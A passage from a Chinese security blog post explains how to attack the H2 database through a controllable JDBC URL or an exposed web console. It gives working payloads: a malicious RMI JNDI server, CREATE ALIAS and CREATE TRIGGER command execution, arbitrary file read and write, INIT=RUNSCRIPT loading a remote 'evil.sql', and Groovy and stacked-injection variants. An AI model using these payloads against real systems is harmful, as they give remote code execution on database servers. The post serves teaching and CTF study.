class="hljs-attr">spring.h2.console.settings.web-allow-others</span>=<span class="hljs-string">true</span><br></code></pre></td></tr></table></figure>

<p>注意这里springboot可以修改h2 console的访问路径，若未配置此项默认为<code>h2-console</code></p>
<p>demo就免了，网上一大把。</p>
<h3 id="H2-JNDI"><a href="#H2-JNDI" class="headerlink" title="H2-JNDI"></a>H2-JNDI</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;<br><span class="hljs-keyword">import</span> org.apache.naming.ResourceRef;<br><br><span class="hljs-keyword">import</span> javax.naming.StringRefAddr;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EvilRMIServer</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> LocateRegistry.createRegistry(<span class="hljs-number">8025</span>);<br>        <span class="hljs-type">ResourceRef</span> <span class="hljs-variable">ref</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResourceRef</span>(<span class="hljs-string">&quot;javax.el.ELProcessor&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-literal">true</span>,<span class="hljs-string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>,<span class="hljs-literal">null</span>);<br>        ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;forceString&quot;</span>, <span class="hljs-string">&quot;x=eval&quot;</span>));<br>        ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;x&quot;</span>, <span class="hljs-string">&quot;\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(\&quot;new java.lang.ProcessBuilder[&#x27;(java.lang.String[])&#x27;]([&#x27;/bin/sh&#x27;,&#x27;-c&#x27;,&#x27;touch /tmp/h2-jndi-success&#x27;]).start()\&quot;)&quot;</span>));<br>        <span class="hljs-type">ReferenceWrapper</span> <span class="hljs-variable">referenceWrapper</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReferenceWrapper</span>(ref);<br>        r.bind(<span class="hljs-string">&quot;evil&quot;</span>,referenceWrapper);<br>        System.out.println(<span class="hljs-string">&quot;running&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>使用BeanFactory本地工厂类实现的JNDI，H2是支持的。</p>
<p><img src="/2024/07/28/Commons-Collections/80357092.png" srcset="/img/loading.gif" lazyload alt="image-20240813180357092"></p>
<p>高版本的H2只允许JNDI lookup的URL以java开头：</p>
<p><img src="/2024/07/28/Commons-Collections/80414155.png" srcset="/img/loading.gif" lazyload alt="image-20240813180414155"></p>
<p>而在H2的函数文档中能发现一处可能造成JNDI注入的：<code>LINK_SCHEMA</code></p>
<p><a target="_blank" rel="noopener" href="http://www.h2database.com/html/functions.html#link_schema">http://www.h2database.com/html/functions.html#link_schema</a></p>
<p><img src="/2024/07/28/Commons-Collections/80443447.png" srcset="/img/loading.gif" lazyload alt="image-20240813180443447"></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> LINK_SCHEMA(<span class="hljs-string">&#x27;EddieMurphy&#x27;</span>, <span class="hljs-string">&#x27;javax.naming.InitialContext&#x27;</span>, <span class="hljs-string">&#x27;rmi://127.0.0.1:8025/evil&#x27;</span>, <span class="hljs-string">&#x27;EddieMurphy&#x27;</span>, <span class="hljs-string">&#x27;EddieMurphy&#x27;</span>, <span class="hljs-string">&#x27;PUBLIC&#x27;</span>);<br></code></pre></td></tr></table></figure>

<p>同样高版本对URL进行了限制，只允许java开头</p>
<h3 id="H2-RCE"><a href="#H2-RCE" class="headerlink" title="H2-RCE"></a>H2-RCE</h3><h4 id="UDF执行"><a href="#UDF执行" class="headerlink" title="UDF执行"></a>UDF执行</h4><ul>
<li><code>CREATE ALIAS</code></li>
</ul>
<p>自定义函数</p>
<p>创建一个shell函数并调用</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">DROP</span> ALIAS IF <span class="hljs-keyword">EXISTS</span> shell;<br><span class="hljs-keyword">CREATE</span> ALIAS shell <span class="hljs-keyword">AS</span> $$void shell(String s) throws Exception &#123;<br>	java.lang.Runtime.getRuntime().<span class="hljs-keyword">exec</span>(s);<br>&#125;$$;<br><span class="hljs-keyword">SELECT</span> shell(<span class="hljs-string">&#x27;cmd /c calc&#x27;</span>);<br></code></pre></td></tr></table></figure>

<p>h2中两个<code>$</code>表示无需转义的长字符串</p>
<p>对比高版本的H2，<code>handleSyntaxError</code>多传了一个参数，若第二个参数是0则直接返回，不进行语法错误处理</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">handleSyntaxError*(output, (ok? <span class="hljs-number">0</span>: <span class="hljs-number">1</span>));<br></code></pre></td></tr></table></figure>

<p>那如果遇上目标用了lombok还是H2低版本呢?只能考虑调用目标本地的静态公开方法</p>
<p>如<code>com.sun.org.apache.xml.internal.security.utils.JavaUtils</code>有两个读写文件的静态公开方法</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">CREATE</span> ALIAS read <span class="hljs-keyword">FOR</span> <span class="hljs-string">&#x27;com.sun.org.apache.xml.internal.security.utils.JavaUtils.getBytesFromFile&#x27;</span>;<br><span class="hljs-keyword">SELECT</span> read(<span class="hljs-string">&#x27;E:/flag.txt&#x27;</span>);<br></code></pre></td></tr></table></figure>

<p>读出来的结果为byte数组，还得转为字符串</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">byte</span>[] bytes = &#123;<span class="hljs-number">0x68</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x6d</span>, <span class="hljs-number">0x79</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x6c</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x67</span>&#125;;<br>System.out.println(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(bytes));  <span class="hljs-comment">// 打印here is my flag</span><br></code></pre></td></tr></table></figure>

<p>虽然<code>writeBytesToFilename</code>第二个参数要求为byte数组，但传字符串也行，H2能够自动转换。或者在十六进制字符串前面加个X。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">CREATE</span> ALIAS write <span class="hljs-keyword">FOR</span> <span class="hljs-string">&#x27;com.sun.org.apache.xml.internal.security.utils.JavaUtils.writeBytesToFilename&#x27;</span>;<br><span class="hljs-keyword">SELECT</span> write(<span class="hljs-string">&#x27;E:/success.txt&#x27;</span>, <span class="hljs-string">&#x27;Arbitrary File Write&#x27;</span>);<br><span class="hljs-keyword">SELECT</span> write(<span class="hljs-string">&#x27;E:/wirte_hex.txt&#x27;</span>, X<span class="hljs-string">&#x27;68657265206973206d7920666c6167&#x27;</span>)<br></code></pre></td></tr></table></figure>

<p>当然还有其他静态方法可以利用，比如</p>
<ul>
<li><code>java.sql.DriverManager#getConnection</code> 连接恶意MySQL服务器</li>
<li><code>javax.naming.InitialContext#doLookup</code> JNDI注入</li>
<li><code>com.alibaba.fastjson.JSON#parseObject</code> FastJson反序列化</li>
<li><code>org.springframework.util.SerializationUtils.deserialize</code> 二次反序列化</li>
</ul>
<h4 id="js执行"><a href="#js执行" class="headerlink" title="js执行"></a>js执行</h4><ul>
<li><code>CREATE TRIGGER</code></li>
</ul>
<p>这个命令稍微麻烦一点，利用的是触发器，即增删改时会触发一些动作，需要新建一张表，或者需要有已知表。</p>
<p>下面上网上流传的poc：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> hack (<br>     id <span class="hljs-type">INT</span> <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span><br>);<br><br><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TRIGGER</span> TRIG_JS AFTER <span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">ON</span> hack <span class="hljs-keyword">AS</span> <span class="hljs-string">&#x27;//javascript</span><br><span class="hljs-string">Java.type(&quot;java.lang.Runtime&quot;).getRuntime().exec(&quot;calc&quot;);&#x27;</span>;<br> <br><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> hack <span class="hljs-keyword">VALUES</span> (<span class="hljs-number">1</span>);<br></code></pre></td></tr></table></figure>

<p>但实际上创建触发器时那段js代码就被执行了，后面插入数据也没有执行</p>
<p>好在这句创建触发器的语句可以多次执行(因为根本没创建成功)</p>
<p>为什么呢？因为这段js代码本意是用来返回一个<code>Trigger</code>对象的</p>
<p>查看官方文档<a target="_blank" rel="noopener" href="https://www.h2database.com/html/commands.html#create_trigger">https://www.h2database.com/html/commands.html#create_trigger</a></p>
<blockquote>
<p>The trigger class must be public and implement <code>org.h2.api.Trigger</code>. Inner classes are not supported. The class must be available in the classpath of the database engine (when using the server mode, it must be in the classpath of the server).</p>
<p>The sourceCodeString must define a single method with no parameters that returns <code>org.h2.api.Trigger</code>. See <code>CREATE ALIAS</code> for requirements regarding the compilation. Alternatively, javax.script.ScriptEngineManager can be used to create an instance of <code>org.h2.api.Trigger</code>. Currently javascript (included in every <code>JRE</code>) and ruby (with <code>JRuby</code>) are supported. In that case the source must begin respectively with <code>//javascript</code> or <code>#ruby</code>.</p>
<p>Example:</p>
<p>CREATE TRIGGER TRIG_INS BEFORE INSERT ON TEST FOR EACH ROW CALL ‘MyTrigger’;</p>
<p>CREATE TRIGGER TRIG_SRC BEFORE INSERT ON TEST AS ‘org.h2.api.Trigger create() { return new MyTrigger(“constructorParam”); }’;</p>
<p>CREATE TRIGGER TRIG_JS BEFORE INSERT ON TEST AS ‘&#x2F;&#x2F;javascript return new Packages.MyTrigger(“constructorParam”);’;</p>
<p>CREATE TRIGGER TRIG_RUBY BEFORE INSERT ON TEST AS ‘#ruby Java::MyPackage::MyTrigger.new(“constructorParam”)’;</p>
</blockquote>
<p>可以用<code>javax.script.ScriptEngineManager</code>来创建一个<code>org.h2.api.Trigger</code>实例</p>
<p><code>org.h2.schema.TriggerObject#loadFromSource</code></p>
<p><img src="/2024/07/28/Commons-Collections/81204143.png" srcset="/img/loading.gif" lazyload alt="image-20240813181204143"></p>
<p>判断是否为js或ruby脚本</p>
<p><img src="/2024/07/28/Commons-Collections/81216278.png" srcset="/img/loading.gif" lazyload alt="image-20240813181216278"></p>
<p>简单判断是否以<code>//javascript</code>开头</p>
<p><img src="/2024/07/28/Commons-Collections/81226959.png" srcset="/img/loading.gif" lazyload alt="image-20240813181226959"></p>
<p>然后就是经典的<code>new ScriptEngineManager().getEngineByName(&quot;javascript&quot;)</code></p>
<p><img src="/2024/07/28/Commons-Collections/81240153.png" srcset="/img/loading.gif" lazyload alt="image-20240813181240153"></p>
<p>返回<code>CompiledScript</code>调用其<code>eval</code></p>
<p>低版本H2(1.4.200之前)貌似不支持js脚本，没有<code>isJavascriptSource</code>这段代码。</p>
<h4 id="出网利用——init-runscript"><a href="#出网利用——init-runscript" class="headerlink" title="出网利用——init+runscript"></a>出网利用——init+runscript</h4><p>上面这些操作的利用前提都是h2 console成功连接到数据库。</p>
<p>低版本H2(<code>1.4.193</code>左右)当连接的数据库不存在时会自动创建，但高版本就不行了</p>
<p>会报错<code>Database &quot;mem:test&quot; not found.either pre-create it or allow remote database creation</code></p>
<p>要么连接Springboot中<code>spring.datasource.url</code>指明的数据库，要么需要启动console时带上<code>-ifNotExists</code>参数</p>
<p>因此能否不连接进去就能执行命令呢?</p>
<p>h2数据库的JDBC URL中支持的一个配置<code>INIT</code></p>
<p>这个参数表示在连接h2数据库时，会执行一条初始化命令。不过只支持执行一条命令，而且不能包含分号<code>;</code></p>
<p>上面<code>CREATE ALIAS</code>用于命令执行的SQL语句都不止一条。可以利用<code>RUNSCRIPT</code>命令。<code>RUNSCRIPT</code>用于执行一个SQL文件</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">jdbc:h2:mem:test;INIT=RUNSCRIPT FROM <span class="hljs-string">&#x27;http://127.0.0.1:8888/evil.sql&#x27;</span><br></code></pre></td></tr></table></figure>

<p>这个方法能用在任何能配置JDBC URL且依赖了H2的地方</p>
<p><img src="/2024/07/28/Commons-Collections/81326106.png" srcset="/img/loading.gif" lazyload alt="image-20240813181326106"></p>
<p>然后就可以URL远程加载恶意类了。</p>
<h4 id="不出网利用——init-groovy"><a href="#不出网利用——init-groovy" class="headerlink" title="不出网利用——init+groovy"></a>不出网利用——init+groovy</h4><p>JDBC连接时<code>INIT</code>只允许执行一条SQL命令，而我们的命令执行有两句，一句创建UDF，一句执行UDF</p>
<p>除非有已知表，使用<code>CREATE TRIGGER</code>就只需一句。实际上可以利用H2的系统表，H2和MySQL一样也有<code>INFORMATION_SCHEMA</code></p>
<blockquote>
<p>The system tables and views in the schema <code>INFORMATION_SCHEMA</code> contain the meta data of all tables, views, domains, and other objects in the database as well as the current settings.</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">jdbc:h2:mem:test;init=CREATE TRIGGER TRIG_JS AFTER INSERT ON INFORMATION_SCHEMA.TABLES AS <span class="hljs-string">&#x27;//javascript</span><br><span class="hljs-string">Java.type(&quot;java.lang.Runtime&quot;).getRuntime().exec(&quot;calc&quot;)&#x27;</span><br></code></pre></td></tr></table></figure>

<p>需要注意的是，H2提取URL中的配置时是通过分割分号<code>;</code>来提取的，因此JS代码中不能有分号，否则会报错（可以加上反斜杠代表转义）</p>
<p><img src="/2024/07/28/Commons-Collections/81406492.png" srcset="/img/loading.gif" lazyload alt="image-20240813181406492"></p>
<p>若目标环境有<code>Groovy</code>依赖，可以使用元编程的技巧来命令执行，在编译<code>Groovy</code>语句而非执行时就执行攻击者的代码。</p>
<p>添加<code>groovy-sql</code>依赖</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.codehaus.groovy<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>groovy-sql<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.0.8<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">jdbc:h2:mem:test;init=CREATE ALIAS shell2 AS<br>$$<span class="hljs-meta">@groovy</span>.transform.ASTTest(value=&#123;<br><span class="hljs-keyword">assert</span> java.lang.Runtime.getRuntime().exec(<span class="hljs-string">&quot;cmd.exe /c calc.exe&quot;</span>)<br>&#125;)<br>def x$$<br></code></pre></td></tr></table></figure>

<h4 id="SQLI-2-RCE"><a href="#SQLI-2-RCE" class="headerlink" title="SQLI 2 RCE"></a>SQLI 2 RCE</h4><p>可见<a target="_blank" rel="noopener" href="https://www.cnblogs.com/EddieMurphy-blogs/p/18015760">HGAME week2-web wp - Eddie_Murphy - 博客园 (cnblogs.com)</a>的SearchVmenber那道题。</p>
<p><code>INIT</code>参数可以直接在连接数据库时执行初始化的sql语句</p>
<p>除了<code>INIT</code>参数，一些参数在连接数据库时会执行SET命令，存在SQL注入</p>
<p>比如<code>TRACE_LEVEL_SYSTEM_OUT</code>、<code>TRACE_MAX_FILE_SIZE</code>……</p>
<p><img src="/2024/07/28/Commons-Collections/81531078.png" srcset="/img/loading.gif" lazyload alt="image-20240813181531078"></p>
<p><code>org.h2.engine.Engine#openSession</code>会对我们传入的参数进行<code>SET</code>语句拼接</p>
<p><img src="/2024/07/28/Commons-Collections/81544236.png" srcset="/img/loading.gif" lazyload alt="image-20240813181544236"></p>
<p>开始尝试堆叠注入</p>
<h4 id="坑：semicolon分割之痛"><a href="#坑：semicolon分割之痛" class="headerlink" title="坑：semicolon分割之痛"></a>坑：semicolon分割之痛</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">jdbc:h2:mem:test;TRACE_LEVEL_SYSTEM_OUT=<span class="hljs-number">3</span>;CREATE TRIGGER TRIG_JS BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$<span class="hljs-comment">//javascript</span><br>Java.type(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>).getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>)$$--<br></code></pre></td></tr></table></figure>

<p>这个payload并不能打通，还得看它是怎么提取setting参数的</p>
<p><code>org.h2.engine.ConnectionInfo#readSettingsFromURL</code> 这个类用于存储连接信息</p>
<p><img src="/2024/07/28/Commons-Collections/81602835.png" srcset="/img/loading.gif" lazyload alt="image-20240813181602835"></p>
<p>问题就出在这，我们用于堆叠注入的分号<code>;</code>，同时也是H2用来提取设置参数的分隔符。。。🥲</p>
<p>但要是settings的值本来就存在分号怎么办，照理是会提供转义的，跟进<code>StringUtils.arraySplit</code>一探究竟</p>
<p><img src="/2024/07/28/Commons-Collections/81626818.png" srcset="/img/loading.gif" lazyload alt="image-20240813181626818"></p>
<p>果然是支持反斜杠转义的。因此在payload中分号前面加上<code>\</code>即可</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">jdbc:h2:mem:test;TRACE_LEVEL_SYSTEM_OUT=<span class="hljs-number">1</span>\;CREATE TRIGGER TRIG_JS BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$<span class="hljs-comment">//javascript</span><br>Java.type(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>).getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>)$$--<br></code></pre></td></tr></table></figure>

<h3 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h3><p>基本纯抄的，因为分析起来太费劲了，尤其是配环境之类的…以前的环境找不到了就又偷个懒。</p>
<p>这里简单介绍了H2的JDBC攻击方法，在JDBC URL可控的情况下（不局限于h2 web console）</p>
<ul>
<li>JNDI注入（高版本限制了只能是java协议）</li>
<li>利用init参数执行<code>RUNSCRIPT</code>命令加载执行远程恶意SQL</li>
<li>利用init参数直接执行<code>groovy</code>元编程代码（不出网）</li>
<li>利用其他连接参数进行堆叠注入</li>
</ul>
<p>当然若能直接连接上去，就能直接UDF命令执行了。</p>
<p>而对于h2 web console，利用方式会受到一些限制：</p>
<ul>
<li>需要开启<code>-webAllowOthers</code>选项，支持外部连接</li>
<li>需要开启<code>-ifNotExists</code>选项，支持创建数据库</li>
</ul>
<p>参考：</p>
<p><a target="_blank" rel="noopener" href="https://p4d0rn.gitbook.io/java/jdbc-attack/h2#springboot-zheng-he">H2 JDBC Attack | Java (gitbook.io)</a></p>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/Java/" class="print-no-link">#Java</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>JDBC</div>
      <div>https://eddiemurphy89.github.io/2024/08/13/JDBC/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>作者</div>
          <div>EddieMurphy</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2024年8月13日</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>许可协议</div>
          <div>
            
              
              
                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
                    <i class="iconfont icon-cc-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2024/08/14/Kyro/" title="Kryo">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">Kryo</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2024/08/12/Spring/" title="Spring">
                        <span class="hidden-mobile">Spring</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
  
  
    <article id="comments" lazyload>
      
  <div class="disqus" style="width:100%">
    <div id="disqus_thread"></div>
    
      <script>
        Fluid.utils.loadComments('#disqus_thread', function() {
          Fluid.utils.createCssLink('https://lib.baomitu.com/disqusjs/1.3.0/disqusjs.css');
          Fluid.utils.createScript('https://lib.baomitu.com/disqusjs/1.3.0/disqus.js', function() {
            new DisqusJS({
              shortname: 'fluid',
              apikey: 'YdcgVedHrqu2ioQd1eVoUrqG'
            });
          });
        });
      </script>
    
    <noscript>Please enable JavaScript to view the comments</noscript>
  </div>


    </article>
  


          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>目录</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
    </div>
  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script  src="/js/local-search.js" ></script>

  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>





<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
</body>
</html>
